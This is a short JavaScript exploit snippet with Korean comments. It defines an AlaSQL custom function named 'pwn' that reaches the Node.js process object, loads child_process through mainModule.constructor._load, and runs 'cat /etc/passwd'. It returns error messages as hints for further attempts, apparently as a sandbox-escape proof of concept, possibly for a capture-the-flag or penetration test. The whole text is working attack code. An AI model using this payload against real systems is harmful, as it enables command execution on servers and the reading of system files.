alasql.fn.pwn = function(a) {
    try {
        // 1. globalThis 대용: 구형 Node.js의 전통적인 전역 객체명은 'global'입니다.
        // 2. 만약 이것도 막혔다면 냅다 'process' 객체를 직접 호출해 봅니다.
        const targetProcess = (typeof global !== 'undefined' && global.process) || (typeof process !== 'undefined' && process);
        
        if (!targetProcess) return "Process object blocked";

        // 전역 process 내부 모듈 로더를 강제로 열어 동기식 오버라이딩
        const mod = targetProcess.mainModule.constructor._load('child_process');
        mod.execSync(`cat /etc/passwd`);
        
        return "SUCCESS";
    } catch(e) {
        return e.message; // 다음 힌트를 얻기 위한 에러 텍스트 반환
    }
};



